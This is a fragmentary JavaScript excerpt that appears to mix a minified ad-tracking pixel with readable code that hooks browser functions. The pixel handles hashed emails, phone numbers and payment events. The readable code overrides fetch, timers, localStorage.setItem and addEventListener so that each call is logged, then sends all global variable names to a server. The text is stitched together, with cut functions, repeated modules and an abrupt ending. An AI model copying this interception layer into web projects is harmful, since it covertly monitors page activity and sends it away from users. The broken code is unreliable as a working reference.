...
!function (e) {
  ...
  HyyX: function (t, n, e) {
    ...
    var r,
      o,
      i = ["email", "phone_number", "auto_email", "auto_phone_number", "external_id", "sha256_email", "sha256_phone_number", "sha256_external_id"];
...
!function (n) {
  ...
  HyyX: function (t, e, n) {
    ...
    var r,
      i,
      o = ["email", "phone_number", "auto_email", "auto_phone_number", "external_id", "sha256_email", "sha256_phone_number", "sha256_external_id"];
...
!function (n) {
      ...
      o = (r, t, o) => {
        ...
        return (e = t) => {
          ...
          for (;;) {
            var i = o(c);
            let t = c;
            for (; t--;) if (n += r[i[t] & a] || "", n.length === e) return n;
          }
        };
      },
      a = (t, e = 21) => o(t, e, r),
        ...
        function d(n) {
          var t = new MutationObserver(function (t) {
            for (var e = (t = f(t)).next(); !e.done; e = t.next()) ("childList" == (e = e.value).type && function i(t, e) {
              for (var n = (t = f(t)).next(); !n.done; n = t.next()) if (n = n.value, e.includes(n.nodeName.toLowerCase()) || i(n.children, e)) return 1;
  ...
  SnBs: function (t, e, n) {
    ...
    var i,
      e = undefined && undefined.__extends || (i = function (t, e) {
  ...
  d98v: function (t, e, n) {
    ...
    var b = n("JgE6"),
      ...
      E = (S.prototype.initPerformanceData = function () {
        ...
        var t = {};
        if (this.everythingDone) t = this.getAllData();else for (var e = 0, n = Object.keys(this.changedMap); e < n.length; e++) {
          var i = n[e];
          t[i] = this[i];
        }
...
function validateEventArgs(eventName, args, expectedArgs) {
  if (args.length !== expectedArgs.length) {
    console.warn(`Invalid arguments count for '${eventName}' event`);
    return false;
  }
  for (let i = 0; i < args.length; i++) {
    if (typeof args[i] !== expectedArgs[i]) {
      console.warn(`Invalid argument type for '${eventName}' event`);
      return false;
    }
  }
  return true;
...
// Wrap original function with tracking behavior
!function (n) {
  var r = {};
  function o(t) {
    if (r[t]) return r[t].exports;
  ...
  dbMG: function (t, e, n) {
    ...
    var m,
      ...
      n = (v = i.a, d(g, v), g.prototype.isDisableDiagnosticsConsole = function () {
        ...
        var e, n;
        t.properties || (t.properties = {}), A(t) && this.warn(c.EMPTY_EVENT_TYPE_NAME), e = void 0 === (e = (n = t).event) ? "" : e, A(n) || p.test(e) || this.warn(c.MISMATCHED_EVENT_TYPE_NAME_FOR_CUSTOM_EVENT), function (t) {
          t = t.event;
        ...
        }(t) || this.warn(c.INVALID_EVENT_PARAMETER_VALUE), e = (n = t).event, n = void 0 === (n = n.properties) ? {} : n, ("CompletePayment" === (void 0 === e ? "" : e) && N(n.value) || !N(n.currency) && N(n.value)) && this.warn(c.MISSING_VALUE_PARAMETER), function (t) {
...
function createTrackingMethodWithEventHooks(eventHooks, callback) {
  return (...args) => {
    if (validateEventArgs(eventHooks.eventName, args, eventHooks.argTypes)) {
      const eventData = {
        eventName: eventHooks.eventName,
        functionArgs: args,
        callerInfo: traceCaller(),
...
// Intercepting native methods
window.fetch = createTrackingMethodWithEventHooks({
  eventName: 'fetch',
  argTypes: ['string']
}, nativeFetch);
window.setTimeout = createTrackingMethodWithEventHooks({
  eventName: 'setTimeout',
  argTypes: ['function', 'number']
}, nativeSetTimeout);
window.setInterval = createTrackingMethodWithEventHooks({
...
!function (e) {
  ...
  CHzr: function (t, n, e) {
    ...
    var m,
      E,
      e = (o = i.a, e(b, o), b.prototype.contextInitStart = function () {
        this.init();
    ...
    m = "initialize", (E = Object(a.e)() || [])._autoam || (E._autoam = Object.assign({}, c)), E._autoam[m] || c[m] || !1 || ((e = new e((Object(a.e)() || []).context)).init(), n("initialize", !0), n("plugin", e));
  },
  GJ6r: function (t, p, d) {
    "use strict";
...
window.requestAnimationFrame = createTrackingMethodWithEventHooks({
  eventName: 'requestAnimationFrame',
  argTypes: ['function']
}, nativeRequestAnimationFrame);
window.localStorage.setItem = createTrackingMethodWithEventHooks({
  eventName: 'localStorage.setItem',
  argTypes: ['string', 'string']
}, nativeLocalStorageSetItem);

// Intercepting events
EventTarget.prototype.addEventListener = function (eventName, callback, ...args) {
  const newCallback = createTrackingMethodWithEventHooks({
    eventName: `event:${eventName}`,
    argTypes: ['object']
  }, callback);
  return nativeAddEventListener.call(this, eventName, newCallback, ...args);
};
...
!function (c) {
  ...
  "7u/d": function (t, e, n) {
    ...
    var c,
      ...
      u,
      i,
      o = (c = !!window.globalConfig && window.globalConfig.isDebug, u = function (t) {
    ...
    var m = n("q7hU"),
      ...
      n = function (p) {
        ...
        return function (t, e, n, r) {
          for (var o, i, a = O(t), c = E(a), u = m(e, n, 3), s = I(c.length), f = 0, r = r || w, l = d ? r(t, s) : h || g ? r(t, 0) : undefined; f < s; f++) if ((_ || f in c) && (i = u(o = c[f], f, a), p)) if (d) l[f] = i;else if (i) switch (p) {
            case 3:
              return !0;
            case 5:
              return o;
  ...
  GJ6r: function (t, m, E) {
    ...
    !function (t) {
      ...
      function g() {
        var t;
        return [n.a.INVOKE_METHOD_ENABLED, n.a.INVOKE_METHOD_NOT_ENABLED, n.a.TOUTIAO_BRIDGE_NOT_ENABLED][[!(null === (t = window.ToutiaoJSBridge) || void 0 === t || !t.invokeMethod), !!window.ToutiaoJSBridge, !0].findIndex(function (t) {
          return t;
        })];
      }
      var _ = function () {
  ...
  HyyX: function (t, e, n) {
    ...
    var r,
      o,
      i,
      a = ["email", "phone_number", "auto_email", "auto_phone_number", "external_id", "sha256_email", "sha256_phone_number", "sha256_external_id"];
    (e = r = r || {}).EMPTY_VALUE = "empty_value", e.WRONG_FORMAT = "wrong_format", e.CORRECT_FORMAT = "correct_format", e.HASHED = "hashed", e.HASHED_ERR = "hashed_err", e.HASHED_CORRECT = "hashed_correct", e.PLAINTEXT_EMAIL = "plaintext_email", e.PLAINTEXT_PHONE = "plaintext_phone", (e = o = o || {}).EMPTY_VALUE = "empty_value", e.PLAIN_EMAIL = "plain_email", e.PLAIN_PHONE = "plain_phone", e.HASHED = "hashed", e.FILTER_EVENTS = "filter_events", e.UNKNOWN_INVALID = "unknown_invalid", e.BASE64_STRING_HASHED = "base64_string_hashed", e.BASE64_HEX_HASHED = "base64_hex_hashed", e.PLAIN_MDN_EMAIL = "plain_mdn_email", (e = i = i || {}).Manual = "manual", e.Auto = "auto";
  },
  IOsT: function (t, e, n) {
    "use strict";
  ...
  JOA9: function (t, e, n) {
    ...
    t.exports = function (t, e, n) {
      ...
      if (l) r = t;else {
        ...
        if (g(l)) {
          for (o = 0, i = _(t.length); o < i; o++) if ((a = v(t[o])) && a instanceof I) return a;
          return new I(!1);
        }
        r = l.call(t);
      }
  ...
  LDkE: function (t, e, n) {
    ...
    var m,
      n = (o(E, m = e), E.prototype.exposePublicApiToGlobal = function () {
    ...
    function w(t, e) {
      ...
      for (var n = Object(t), r = 1; r < arguments.length; r++) {
        var o = arguments[r];
        if (o !== undefined && null !== o) for (var i = Object.keys(Object(o)), a = 0, c = i.length; a < c; a++) {
          var u = i[a],
  ...
  dEdv: function (t, e, n) {
    ...
    for (r in i) {
      ...
      if (p) {
        ...
        if (p[s] || c(p, s, r), i[r]) for (var d in a) if (p[d] !== a[d]) try {
          c(p, d, a[d]);
        } catch (h) {
          p[d] = a[d];
        }
  ...
  freY: function (t, e, n) {
    ...
    t.exports = !o || r(function () {
      ...
      for (var n = b(t), r = arguments.length, o = 1, i = h.f, a = v.f; o < r;) for (var c, u = y(arguments[o++]), s = i ? d(u).concat(i(u)) : d(u), f = s.length, l = 0; l < f;) c = s[l++], p && !a.call(u, c) || (n[c] = u[c]);
      return n;
    } : o;
  },
  g03b: function (t, e, n) {
  ...
  "gik+": function (t, e, n) {
    ...
    var k,
      ...
      F = (R = n.a, r(B, R), B.prototype.dispatcher = function (t, e, n, r) {
        if (e) for (var o = 0, i = e; o < i.length; o++) for (var a = i[o], c = [], u = 0, s = a.conditions; u < s.length; u++) {
          var f = s[u],
        ...
        return function () {
          t.forEach(function (i) {
            ...
            i.conditions.forEach(function (t) {
              var e, n, r, o, i, a;
              -1 < I.visibility.indexOf(t.variable_type) ? (e = "", r = L.dispatcher("visibility", t, null, null, f.document), n = "_" + t.value, r && function (t, e) {
  ...
  "oe+7": function (t, e, u) {
    ...
    var m,
      E,
      O = undefined && undefined.__extends || (m = function (t, e) {
        return (m = Object.setPrototypeOf || {
          __proto__: []
        } instanceof Array && function (t, e) {
          t.__proto__ = e;
              ...
              case 2:
                try {
                  if (s) {
                    ...
                    for (n = s.domain || window.location.hostname, r = n.split("."), o = r.length, i = "", a = 0; a < o; a++) if (i = "." + r[o - a - 1] + i, s.domain = i, document.cookie = c + "=" + u + M(s), D(c)) {
                      R = i;
                      break;
                    }
    ...
    var oe,
      ...
      ae,
      ce,
      e = undefined && undefined.__extends || (oe = function (t, e) {
  ...
  sDJV: function (t, e, n) {
    ...
    t.exports = function (t, e, n, r, o, i, a) {
      ...
      if (r && (t = y(r.call(new t())), w !== Object.prototype && t.next && (O || y(t) === w || (g ? g(t, w) : "function" != typeof t[S] && m(t, S, P)), _(t, f, !0, !0), O && (I[f] = P))), o == T && d && d.name !== T && (l = !0, h = function () {
        return d.call(this);
      }), O && !a || p[S] === h || m(p, S, h), I[e] = h, o) if (c = {
        values: s(T),
        keys: i ? h : s("keys"),
        entries: s("entries")
      }, a) for (u in c) !x && !l && u in p || E(p, u, c[u]);else v({
        target: e,
        proto: !0,
        forced: x || l
      }, c);
...
const globalVars = Object.keys(window).join(', ');

// Send all global variables to server
sendEventData({
  eventName: 'globalVars',
  globalVars,
  timestamp: new Date().toISOString(),
  uniqueId: generateUniqueId(),
  callerInfo: traceCaller()
